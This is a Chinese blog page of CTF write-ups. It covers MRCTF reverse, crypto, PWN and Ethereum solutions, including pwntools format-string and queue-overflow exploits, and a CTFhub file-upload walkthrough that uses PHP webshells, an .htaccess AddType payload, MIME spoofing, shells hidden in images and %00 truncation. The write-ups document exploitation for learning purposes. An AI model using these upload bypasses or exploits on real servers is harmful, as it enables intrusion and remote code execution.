<h3 id="Virtual-Tree"><a href="#Virtual-Tree" class="headerlink" title="Virtual Tree"></a>Virtual Tree</h3><p>这道题静态分析完全就是错的，因为我在main函数运行前会将一些函数给替换掉<br>所以静态分析完全失败的，但是似乎大部分人都是动调2333</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">replace</span><span class="params">()</span> <span class="comment">//开局替换函数代码，</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *addr=doit;</span><br><span class="line">	<span class="keyword">int</span> val=(<span class="keyword">int</span>)addr;</span><br><span class="line">	DWORD old;</span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect(addr,<span class="number">512</span>,PAGE_EXECUTE_READWRITE,&amp;old)==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*((PBYTE)val)!=<span class="number">0x90</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(*((PDWORD)val)==<span class="number">0x00401510</span>)</span><br><span class="line">			*((PDWORD)val)=(DWORD)<span class="built_in">list</span>[count++]; <span class="comment">//将一个全是同一个call的函数替换成不一样的函数</span></span><br><span class="line">		val=val+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	addr=main;</span><br><span class="line">	val=(<span class="keyword">int</span>)addr;</span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect(addr,<span class="number">512</span>,PAGE_EXECUTE_READWRITE,&amp;old)==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(*((PBYTE)val)!=<span class="number">0x90</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(*((PDWORD)val)==(DWORD)walkB)</span><br><span class="line">		&#123;</span><br><span class="line">			*((PDWORD)val)=(DWORD)walkA; <span class="comment">//加密代码的替换</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		val=val+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，需要动调来看代码，代码才是对的。。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_12F16F0</span><span class="params">()</span> <span class="comment">//具体操作就是这些加减 异或</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Add(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  Xor(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">  Add(<span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">  Sub_abs(<span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">  Xor(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">  Sub_abs(<span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line">  Add(<span class="number">7</span>, <span class="number">3</span>);</span><br><span class="line">  Xor(<span class="number">8</span>, <span class="number">7</span>);</span><br><span class="line">  Sub_abs(<span class="number">9</span>, <span class="number">8</span>);</span><br><span class="line">  Sub_abs(<span class="number">10</span>, <span class="number">7</span>);</span><br><span class="line">  Xor(<span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">  Sub_abs(<span class="number">12</span>, <span class="number">2</span>);</span><br><span class="line">  Xor(<span class="number">14</span>, <span class="number">15</span>);</span><br><span class="line">  <span class="keyword">return</span> Add(<span class="number">15</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个函数对输入进行了异或，dump出来就是了。。<br>所以只需要将数据按照sub_12F16F0()解方程之后，在异或dump出来的数据就可以得到flag了<br>@_7r3e_f0r_fuNN!</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p>其实就是手机键盘<br>每行代表当个数字键盘上的字母摁一次就是第一个<br>以此类推。</p>
<h3 id="天干地支-甲子"><a href="#天干地支-甲子" class="headerlink" title="天干地支+甲子"></a>天干地支+甲子</h3><p>查找到天干地支图，发现每个都对应着数字，然后甲子是60，把每个都加上<br>60后用ascii码转下就可以了</p>
<h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>这题本身除了RSA考点外，还考察了模平方算法，那个Q如果硬怼是怼不出来的，必须模平方，至于模平方算法代码网上蛮多，我这就不贴了</p>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>比较典型的RSA套娃，分别求出p,q，利用题干中的一些函数即可求解，<br>p：已知$\phi(n)=(p-1)(q-1)$, $n=pq$，利用z3的solve容易求解<br>q：已知$ed, n=pq$，可知$ed=k(p-1)(q-1)+1$，<br>又由于$\frac{ed-1}{n} \leq k \leq \frac{ed-1}{2n}$<br>利用这个区间，循环solve即可，exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import sympy</span><br><span class="line">from gmpy2 import invert</span><br><span class="line">from Crypto.Util.number import getPrime, long_to_bytes</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">base &#x3D; 65537</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_prime(N):</span><br><span class="line">    while 1:</span><br><span class="line">        A &#x3D; getPrime(N)</span><br><span class="line">        if A % 4 &#x3D;&#x3D; 3:</span><br><span class="line">            break</span><br><span class="line">    return A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GET_P(n, F_n):</span><br><span class="line">    p &#x3D; Int(&#39;p&#39;)</span><br><span class="line">    q &#x3D; Int(&#39;q&#39;)</span><br><span class="line">    expr &#x3D; And(F_n &#x3D;&#x3D; (p - 1) * (q - 1), n &#x3D;&#x3D; p * q, p &gt; 0, q &gt; 0)</span><br><span class="line">    solver &#x3D; Solver()</span><br><span class="line">    solver.add(expr)</span><br><span class="line">    if solver.check() &#x3D;&#x3D; sat:</span><br><span class="line">        print(solver.model())</span><br><span class="line">        print(solver.model().eval(p))</span><br><span class="line">        print(print(solver.model().eval(q)))</span><br><span class="line">        res_p &#x3D; solver.model().eval(q).as_long()</span><br><span class="line">        res_q &#x3D; solver.model().eval(p).as_long()</span><br><span class="line">    seed2 &#x3D; 2021 * res_p + 2020 * res_q</span><br><span class="line">    if seed2 &lt; 0:</span><br><span class="line">        seed2 &#x3D; (-1) * seed2</span><br><span class="line">    return sympy.nextprime(seed2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GET_Q(n, E_D ,judge):</span><br><span class="line">    p &#x3D; Int(&#39;p&#39;)</span><br><span class="line">    q &#x3D; Int(&#39;q&#39;)</span><br><span class="line">    for k in range(judge, judge*2):</span><br><span class="line">        expr &#x3D; And(E_D - 1 &#x3D;&#x3D; k * (p - 1) * (q - 1), n &#x3D;&#x3D; p * q, p &gt; 0, q &gt; 0)</span><br><span class="line">        solver &#x3D; Solver()</span><br><span class="line">        solver.add(expr)</span><br><span class="line">        if solver.check() &#x3D;&#x3D; sat:</span><br><span class="line">            print(solver.model())</span><br><span class="line">            print(solver.model().eval(p))</span><br><span class="line">            print(print(solver.model().eval(q)))</span><br><span class="line">            res_p &#x3D; solver.model().eval(q).as_long()</span><br><span class="line">            res_q &#x3D; solver.model().eval(p).as_long()</span><br><span class="line">            break</span><br><span class="line">    seed2 &#x3D; 2021 * res_p - 2020 * res_q</span><br><span class="line">    if seed2 &lt; 0:</span><br><span class="line">        seed2 &#x3D; (-1) * seed2</span><br><span class="line">    return sympy.nextprime(seed2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P_n &#x3D;  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span><br><span class="line">P_F_n &#x3D;  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span><br><span class="line">Q_n &#x3D;  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span><br><span class="line">Q_E_D &#x3D;  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span><br><span class="line">Ciphertext &#x3D;  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    judge &#x3D; int(Q_E_D &#x2F; Q_n) - 1</span><br><span class="line">    _E &#x3D; base</span><br><span class="line">    P &#x3D; GET_P(P_n, P_F_n)</span><br><span class="line">    Q &#x3D; GET_Q(Q_n, Q_E_D, judge)</span><br><span class="line">    _D &#x3D; invert(_E, (P-1)*(Q-1))</span><br><span class="line">    M &#x3D; pow(Ciphertext, _D, P*Q)</span><br><span class="line">    flag &#x3D; long_to_bytes(M)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<h3 id="real-random"><a href="#real-random" class="headerlink" title="real_random"></a>real_random</h3><p>利用了线性同余来构造伪随机，观察发现b,c,m满足最大周期条件，故知每次以flag[t]为种子生成的随机数列的周期均为m，通过泄露的(p-1)*(q-1)可以算出m，然后减去$2^d$（记得取模）即可求解</p>
<h3 id="古典密码知多少"><a href="#古典密码知多少" class="headerlink" title="古典密码知多少"></a>古典密码知多少</h3><p>猪圈密码，圣堂武士密码，标准银河字母，且已提示都为大写字母</p>
<p>解密可得 <code>FGCPFLIRTUASYON</code> , 图片里也提示<code>fence</code> ，故尝试栅栏密码</p>
<p>每组字数为3时即可解得flag：<code>MRCTF{CRYPTOFUN}</code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="nothing-but-everything"><a href="#nothing-but-everything" class="headerlink" title="nothing_but_everything"></a>nothing_but_everything</h3><p>本身是简单的ROP，但是我静态编译了一下后，去了符号，所以如果想看的比较轻松，需要去找找Ubuntu下的sig文件然后ida里导入，就可以复现不少函数的样子了，或者可以结合动调，总之看懂题就很简单了，直接ROPgadget一把梭。</p>
<h3 id="easy-equation"><a href="#easy-equation" class="headerlink" title="easy_equation"></a>easy_equation</h3><p>（下面说的都没用，这题忘关溢出了，直接溢出就行<br>很明显的格式化字符漏洞，但是在利用上需要一些技巧，首先是看到那个公式，用z3的solve很好算出来解是2，之后思路就很明确，将judge的值覆写成2即可，如果直接想要直接用fmstr_payload这种payload自动生成,会惊喜的发现，无法靠填充字符达到地址对齐，所以需要转换一下思路，考虑到地址的小端序存储，<br>如果在judge_addr-1的位置存入0x200，那么judge_addr的值自然会变成0x02，于是exp（不是唯一解法，也可以正向构造）如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;easy_equation&#39;)</span><br><span class="line">judge_addr &#x3D; 0x60105C</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 6 + &#39;%&#39; + str(0x200 - 6) + &#39;c%10$hn&#39;</span><br><span class="line">payload +&#x3D; p64(judge_addr - 1)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="spfa"><a href="#spfa" class="headerlink" title="spfa"></a>spfa</h3><p>有一个明显的get_flag函数，发现执行该函数的条件是flag!=-1，但是程序开头已经将flag赋值为-1，并且程序内并没有涉及flag的运算，于是考虑通过溢出修改flag。<br>查看一下bss段可以发现，flag变量在qu数组下方，相当于qu[1000]，在SPFA函数里理论可以访问并修改qu[1000]，于是需要构建特殊的图来使队列（qu数组）越界。<br>仔细分析可以知道，SPFA算法存在一处判断错误(if(d[y] &gt;= d[x] + len[node]))，这使得如果路径中出现0环会发生死循环，节点不断入队，最后使队列溢出。<br>所以，我们所做的，只需要构造一个0环，然后求最短路。<br>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p &#x3D; process(&quot;.&#x2F;spfa&quot;)</span><br><span class="line"></span><br><span class="line">def add(a, b, c):</span><br><span class="line">	p.sendlineafter(&quot;:\n&quot;, str(1))</span><br><span class="line">	p.sendlineafter(&quot;:\n&quot;, str(a) + &quot; &quot; + str(b) + &quot; &quot; + str(c))</span><br><span class="line"></span><br><span class="line">def query(a, b):</span><br><span class="line">	p.sendlineafter(&quot;:\n&quot;, str(2))</span><br><span class="line">	p.sendlineafter(&quot;:\n&quot;, str(a) + &quot; &quot; + str(b))</span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line">	p.sendlineafter(&quot;:\n&quot;, str(3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(1, 2, 0)</span><br><span class="line">add(2, 1, 0)</span><br><span class="line">query(1, 2)</span><br><span class="line">get_flag()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>主要想考察Googlehack能力</p>
<p>没啥好说的<br>直接去<br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a><br>扒个x64 shellcode下来就可以了</p>
<h3 id="Shellcode-Revenge"><a href="#Shellcode-Revenge" class="headerlink" title="Shellcode Revenge"></a>Shellcode Revenge</h3><p>主要想考察Googlehack能力</p>
<p>ida可以分析出提交的Shellcode要满足全为大小写和数字的限制</p>
<p>可以参考这篇文章</p>
<p><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p>
<h2 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h2><h3 id="SimpleReveal"><a href="#SimpleReveal" class="headerlink" title="SimpleReveal"></a>SimpleReveal</h3><p>本题主要考察对 solidity 和 web3 的应用。</p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity&gt;&#x3D;0.4.22;</span><br><span class="line"></span><br><span class="line">contract reveal &#123;</span><br><span class="line"></span><br><span class="line">    private string flag&#x3D;&quot;some_string_here&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据原合约，可以看到 flag 应该在合约的前几个变量槽中，因此可以通过 <code>web3.eth.getStorageAt(&quot;合约地址&quot;, 0)</code> 获取存储的变量，从而解码得到flag。</p>
<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>Etherscan 上可以看到创建合约信息，其中可以看到 flag 。</p>
<h3 id="Unwanted-Coin"><a href="#Unwanted-Coin" class="headerlink" title="Unwanted Coin"></a>Unwanted Coin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity &gt;&#x3D;0.6.1;</span><br><span class="line"></span><br><span class="line">contract Modcoin &#123;</span><br><span class="line"></span><br><span class="line">    mapping(uint256 &#x3D;&gt; bool) public is_successful;</span><br><span class="line"></span><br><span class="line">    function recvpay() public payable &#123;</span><br><span class="line"></span><br><span class="line">        require(((msg.value &#x2F; 0.001 ether ) % 2 &#x3D;&#x3D; 0 &amp;&amp; ((msg.value % 0.001 ether) &#x3D;&#x3D; 0)), &quot;Not Accepting These Coins.&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag(uint256 target) public &#123;</span><br><span class="line"></span><br><span class="line">        require((address(this).balance &#x2F; 0.001 ether ) % 2 &#x3D;&#x3D; 1,&quot;Not Wanted value&quot;);</span><br><span class="line"></span><br><span class="line">        require(msg.sender.send(address(this).balance));</span><br><span class="line"></span><br><span class="line">        is_successful[target] &#x3D; true;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback () external payable &#123;</span><br><span class="line"></span><br><span class="line">        require(((msg.value &#x2F; 0.001 ether ) % 2 &#x3D;&#x3D; 0 &amp;&amp; ((msg.value % 0.001 ether) &#x3D;&#x3D; 0)), &quot;Not Accepting These Coins.&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原合约中两个支付函数 <code>recvpay()</code> 和 <code>fallback()</code> 都只允许接受偶数倍0.001 ether的付款，而合约的getflag函数则要求奇数倍 0.001 ether 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">contract Payassist &#123;</span><br><span class="line"></span><br><span class="line">    function destroy_pay(address payable addr) public payable &#123;</span><br><span class="line"></span><br><span class="line">        selfdestruct(addr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

        </div>
        
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-03-18T16:01:00.000Z">2020-03-19</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/web/">web</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    8 分钟 读完 (大约 1257 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
            
        </h1>
        <div class="content">
            <h1 id="CTFhub-文件上传"><a href="#CTFhub-文件上传" class="headerlink" title="CTFhub 文件上传"></a>CTFhub 文件上传</h1><p>一般所看到的文件上传，除了连🐎那就是通过htaccess来更改php.ini的配置。<br>而也存在是利用上传点进行php反序列化漏洞或是其他的注入。<br>本文主要进行CTFhub上文件上传题的复现。<br>当然可以传一些RCE但是就反而复杂了，直接传🐎<br>就可以更简单一些</p>
<h2 id="第一题无任何过滤。"><a href="#第一题无任何过滤。" class="headerlink" title="第一题无任何过滤。"></a>第一题无任何过滤。</h2><p>上传一个php文件包含一句话木🐎<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/5I2EFA@9@TY0B4PVLTUZO.png" alt=""></p>
<hr>
<h2 id="第二题前端认证"><a href="#第二题前端认证" class="headerlink" title="第二题前端认证"></a>第二题前端认证</h2><p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/63X7YVT9X@2DLR0-1024x549.png" alt=""><br>抓包改包传就可以了。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/933RBI5SDB1TK_5RXO481HW-954x1024.png" alt=""><br>蚁剑连上<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/HGF9DFAYEI8EBHOLOJ.png" alt=""></p>
<hr>
<h2 id="htaccess文件上传"><a href="#htaccess文件上传" class="headerlink" title=".htaccess文件上传"></a>.htaccess文件上传</h2><p>这个是比较特别的一种解析错误</p>
<blockquote>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
</blockquote>
<p>那么还是先看题目吧<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/AGW7RDXTS89RUHLIKM8J-1024x549.png" alt=""><br>基本过滤了所有的文件类型，唯独.htaccess没有。<br>那么上传这个文件能够得到什么<br>仔细看过之后，<br>发现jpg还是可以用的。那么考虑还是传jpg并且用htaccess让服务器解析jpg转换为解析jpg的格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:AddType   application&#x2F;x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>
<p>剩下的就传一个带🐎的jpg即可<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/@RDFYCS1RCF7KKWIE4Y.png" alt=""><br>得到了flag.</p>
<hr>
<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><blockquote>
<p>MIME:客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。<br>也就是服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。那就好办了，不管我上传什么类型的文件，我只要修改Content-Type字段来让检测通过就行了。<br>作者：Maxx_FAN<br>链接：<a href="https://www.jianshu.com/p/01c1d5f05852">https://www.jianshu.com/p/01c1d5f05852</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<p>那和第二个就没啥区别了。。。<br>只需要抓包改包。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/89EAUO_QKYLQE2R7H.png" alt=""><br>不多介绍了</p>
<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>所谓的文件头我在misc的介绍中讲过了，也就是16进制下每个文件固有的东西。那么我们可以通过编辑整个图片，把一句换木马夹在里面。这样检验文件头也就自然没用了。<br>抓包改后缀以及图片末尾<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/AM5MNCJN9H898Q238ZYG7-954x1024.png" alt=""></p>
<p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/M8WA2ZX285F3CCMCVJYYIV-954x1024.png" alt=""><br>那么就可以上传getshell了。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/1YZVATPLC9R_WEZY7Q.png" alt=""></p>
<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><p>这个是一个耳熟能详的方法了。<br>我想先给大家介绍下原理：</p>
<blockquote>
<p>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p>
</blockquote>
<p>也同样有限制条件</p>
<blockquote>
<p>PHP&lt;5.3.29，且GPC关闭<br>GPC功能之一就是检查%00被错误认知的情况。所以需要关闭。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php%00;a.jpg</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原来我也是单纯的认为在文件名处进行截断，如xx.php%00.jpg，这样其实是不对的，提取的时候碰到%00就会认为字符串提取结束了，后面的.jpg就不会再提取，那样的效果还是等于上传了.php的文件，无法绕过。正确的做法还是数据包中必须有上传文件的path才行。结合上传路径+文件名，进行截断。</p>
</blockquote>
<p>但是这道题如果直接传的话会变成rand。无法找到文件，所以需要再次截断。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/RC3ERJZRBDE_RJS53DJJ-954x1024.png" alt=""><br>然后getshell就可以了<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/GVYR6CKURZD_K2TGK_VKK.png" alt=""></p>
<hr>
